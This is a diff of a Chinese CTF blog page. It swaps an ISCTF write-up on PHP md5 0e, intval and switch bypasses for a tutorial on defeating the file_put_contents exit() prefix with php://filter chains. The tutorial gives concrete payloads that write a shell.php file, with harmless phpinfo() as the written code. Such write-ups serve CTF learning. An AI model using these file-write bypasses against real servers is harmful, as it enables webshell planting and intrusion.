@@ -17,7 +17,6 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://csd0617.github.io';</script>
   
   <title>
-    ISCTF小蓝鲨的冒险 |
     
     达达
   </title>
@@ -32,20 +31,17 @@
 
   
   
-    <meta name="description" content="get传参b&#x3D;a[0]&#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X &#x3D; 0**。 结果是 0 &#x3D;&#x3D; 0，所以 **返回 true**。 然后post  num num&#x3D;2024  不能有字母">
+    <meta name="description" content="php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCTF小蓝鲨的冒险">
-<meta property="og:url" content="http://csd0617.github.io/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/index.html">
+<meta property="og:title" content="达达">
+<meta property="og:url" content="http://csd0617.github.io/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="达达">
-<meta property="og:description" content="get传参b&#x3D;a[0]&#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X &#x3D; 0**。 结果是 0 &#x3D;&#x3D; 0，所以 **返回 true**。 然后post  num num&#x3D;2024  不能有字母">
+<meta property="og:description" content="php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://csd0617.github.io/picture/image-20250330101955635.png">
-<meta property="og:image" content="http://csd0617.github.io/picture/image-20250330104552398.png">
-<meta property="article:published_time" content="2025-03-30T02:56:00.000Z">
-<meta property="article:modified_time" content="2025-03-31T11:18:24.732Z">
+<meta property="article:published_time" content="2025-04-01T13:32:55.990Z">
+<meta property="article:modified_time" content="2025-04-02T04:02:26.710Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250330101955635.png">
   
   
     <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
@@ -177,8 +173,16 @@
 </div>
 <header id="header">
   
-    <picture></picture>
-    <img  fetchpriority="high" src="/../covers/2.jpg" alt="ISCTF小蓝鲨的冒险">
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="">
+        
+      
+    
   
   <div id="header-outer">
     <div id="header-title">
@@ -186,13 +190,15 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">ISCTF小蓝鲨的冒险</h1>
+            <h1 data-aos="slide-up">达达</h1>
           </a>
         
       
       
         
         <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+            <a href="/" id="subtitle">又菜又爱摆</a>
           
         </h2>
       
@@ -213,7 +219,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -297,13 +303,13 @@
   
 </aside>
 
-          <section id="main"><article id="post-小蓝鲨的冒险" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-php死亡exit()绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
-    <time datetime="2025-03-30T02:56:00.000Z" itemprop="datePublished">2025-03-30</time>
-    <time style="display: none;" id="post-update-time">2025-03-31</time>
+    <time datetime="2025-04-01T13:32:55.990Z" itemprop="datePublished">2025-04-01</time>
+    <time style="display: none;" id="post-update-time">2025-04-02</time>
   </span>
 </div>
 
@@ -316,38 +322,91 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p><img src="/../picture/image-20250330101955635.png" alt="image-20250330101955635"></p>
-<p><strong>get传参b&#x3D;a[0]&#x3D;QLTHNDT</strong></p>
-<p>md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头</p>
-<p>因为<strong>PHP 试图解析它们为数值</strong>，发现它们符合 <code>0eX</code>（科学计数法），都被解释为 **<code>0 * 10^X = 0</code>**。</p>
-<p>结果是 <code>0 == 0</code>，所以 **返回 <code>true</code>**。</p>
-<p>然后post  num</p>
-<p>num&#x3D;2024  不能有字母    intval($num,0)&#x3D;2024</p>
-<p>小数点绕过即可   </p>
-<p><strong>post传参num&#x3D;2024.1</strong></p>
-<p>intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p>
-<p>接下来是一个switch循环   </p>
-<p><strong>get传参  which&#x3D;flag</strong></p>
-<p>在 PHP 中，<code>switch</code> 语句的比较是通过 <strong>严格比较（&#x3D;&#x3D;）</strong> 来进行的。当你传递一个非数字字符串（例如 <code>&quot;flag&quot;</code>）时，PHP 会<strong>尝试将其转换为数字</strong>。这个转换过程有些特殊，通常会把任何非数字字符串转换为 **<code>0</code>**。</p>
-<p>也就是</p>
-<ul>
-<li>PHP 会自动尝试将 <code>&quot;flag&quot;</code> 转换为数字。在 PHP 中，<strong>任何非数字字符串</strong>（例如 <code>&quot;flag&quot;</code>）都会被转换为数字 <code>0</code>。</li>
-<li>因此，<code>switch(&quot;flag&quot;)</code> 会变成 <code>switch(0)</code>，然后与 <code>case 0</code> 进行匹配。</li>
-<li>结果会进入 <code>case 0</code> 分支，并执行 <code>print(&#39;QAQ&#39;);</code>，然后因为没有 <code>break</code>，会继续执行后面的 <code>case</code>1  csae2 语句。</li>
-</ul>
-<p><strong>为什么要传  flag呢？</strong></p>
-<p><code>require_once</code> 会将指定的文件包含到当前文件中，从而使得该文件中的代码能够在当前文件中使用。</p>
-<p>require_once（）也就是一个文件包含函数    与include类似（这里也就是一个文件包含漏洞）</p>
-<p><strong><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</strong></p>
-<p><strong>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</strong></p>
-<p>而传flag的原因就是   </p>
-<p>该目录下有flag.php这个文件   可以使用require_once进行文件包含  而不报错   从而执行echo  flag这条命令</p>
-<p><strong>为什么只有flag.php才能输出flag   而index.php等其他文件不能呢</strong>？</p>
-<p>因为$flag  这个变量只在flag.php文件下存在   只有将flag.php包含  才能正确输出来$flag变量的内容</p>
-<p>所以这里的payload为</p>
-<p>get  ：  ?b&#x3D;a[0]&#x3D;QLTHNDT&amp;which&#x3D;flag</p>
-<p>post:     num&#x3D;2024.1</p>
-<p><img src="/../picture/image-20250330104552398.png" alt="image-20250330104552398"></p>
+        <h1 id="php死亡exit-绕过"><a href="#php死亡exit-绕过" class="headerlink" title="php死亡exit()绕过"></a>php死亡exit()绕过</h1><p>需要绕过exit()的地方一般都是<code>file_put_contents</code></p>
+<p>大致有如下三种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>tips：伪协议处理时会对过滤器urldecode一次；面对不可用的规则是报个Warning，然后跳过继续执行</strong></p>
+<h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>base64编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.base64-decode/resource=shell.php</span><br><span class="line">content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>利用php:&#x2F;&#x2F;filter 伪协议  先将  &lt;?php exit();”.$content   也就是  &lt;?php exit();aPD9waHAgcGhwaW5mbygpOz8+  内容解码后再写入  shell.php  文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;`base64编码后为`PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
+<p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
+<?  空格  ;  为什么不算呢？
+
+**Base64 解码时，符号的处理方式**
+
+在 PHP 中，`base64_decode()` 只处理 **Base64 允许的字符**，即：
+
+- `A-Z`
+- `a-z`
+- `0-9`
+- `+` 和 `/`
+- `=`（填充符）
+
+**任何不在这个范围内的符号**（例如空格、`<`, `?`, `;`）：
+
+- 如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 `false`（如果 `strict` 参数为 `true`）。
+- 但 `base64_decode()` **不会把它们当作特殊字符处理**，它只是单纯地按照 Base64 规则解析。
+
+所以base解码并不会识别<?  空格  ;  也就是只有七个字节需要加一个字节来凑一下  使其满足编码
+
+解码 <?php exit();aPD9waHAgcGhwaW5mbygpOz8+ 的结果
+
+![image-20250402073407130](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073407130.png)
+
+rot13编码绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
+
+原理同上  因为rot13编码不用考虑前面的字符长度，更为方便
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
+
+解码结果    
+
+![image-20250402073842578](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073842578.png)
+
+但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误
+
+过滤器嵌套绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br><span class="line">content=?&gt;PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再进行base64解码
+
+![image-20250402074843701](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402074843701.png)
+
+第一行为执行strip_tags的结果
+
+第二行对strip_tags执行的结果进行base64解码
+
+需要注意的是`string.strip_tags`在php7.3.0以上的环境下会发生段错误，从而导致无法写入，php5则不受影响
+
+另外一种payload
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=shell.php</span><br><span class="line">content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+先进行压缩，再转小写，再解压，最后可以非常巧合的发现目的代码并没有发生改变
+
+### 第二种情况
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+#### rot13编码绕过
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+结果如下
+
+
+
+如果`rot`被过滤了的话可以考虑二次编码
 
       
     </div>
@@ -357,8 +416,8 @@
       
       
       
-        <a data-aos="zoom-in" href="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/#comments" class="article-comment-link">
-          <span class="post-comments-count waline-comment-count" data-path="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/" itemprop="commentCount"></span>
+        <a data-aos="zoom-in" href="/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">
+          <span class="post-comments-count waline-comment-count" data-path="/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/" itemprop="commentCount"></span>
           留言
         </a>
       
@@ -366,7 +425,7 @@
       
       
         <span data-aos="zoom-in" class="article-visitor-link">
-          <span class="waline-pageview-count" data-path="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/">0</span>
+          <span class="waline-pageview-count" data-path="/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/">0</span>
           <em class="post-meta-item-text">阅读量</em>
         </span>
       
@@ -377,31 +436,17 @@
   
   <nav id="article-nav" data-aos="fade-up">
     
-      
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          <img data-src="/../covers/4.jpg" data-sizes="auto" alt="ISCTF 千年樱" class="lazyload">
-        
-        <a href="/2025/03/31/ISCTF%20%20%E5%8D%83%E5%B9%B4%E6%A8%B1/"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            ISCTF 千年樱
-          
-        </h3>
-      </div>
-    
     
     
     <div class="article-nav-link-wrap article-nav-link-right">
       
-        <img data-src="/../covers/3.jpg" data-sizes="auto" alt="NSSRound#28 Team ez_php" class="lazyload">
+        <img data-src="/../covers/6.png" data-sizes="auto" alt="polar 写shell" class="lazyload">
       
-      <a href="/2025/03/27/NSSRound%20Teamez_php/"></a>
+      <a href="/2025/04/01/polar%20%20%E5%86%99shell/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          NSSRound#28 Team ez_php
+          polar 写shell
         
       </h3>
     </div>
@@ -479,7 +524,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -626,14 +671,14 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "达达",
-          title: "ISCTF小蓝鲨的冒险",
-          url: "http://csd0617.github.io/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/",
+          title: "",
+          url: "http://csd0617.github.io/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/",
           excerpt: "",
           description: "",
-          stripContent: " get传参b&amp;#x3D;a[0]&amp;#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X = 0**。 结果是 0 == 0，所以 **返回 true**。 然后post  num num&amp;#x3D;2024  不能有字母    intval($num,0)&amp;#x3D;2024 小数点绕过即可    post传参num&amp;#x3",
-          date: "Sun Mar 30 2025 10:56:00 GMT+0800",
-          updated: "Mon Mar 31 2025 19:18:24 GMT+0800",
-          cover: "/../covers/2.jpg",
+          stripContent: "php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($content,&amp;quot;&amp;lt;?php exit();&amp;quot;.$content);file_put_contents($filename,$content . &amp;quot;\nxxxxxx&amp;quot",
+          date: "Tue Apr 01 2025 21:32:55 GMT+0800",
+          updated: "Wed Apr 02 2025 12:02:26 GMT+0800",
+          cover: "/images/banner.webp",
         };
       </script>
        
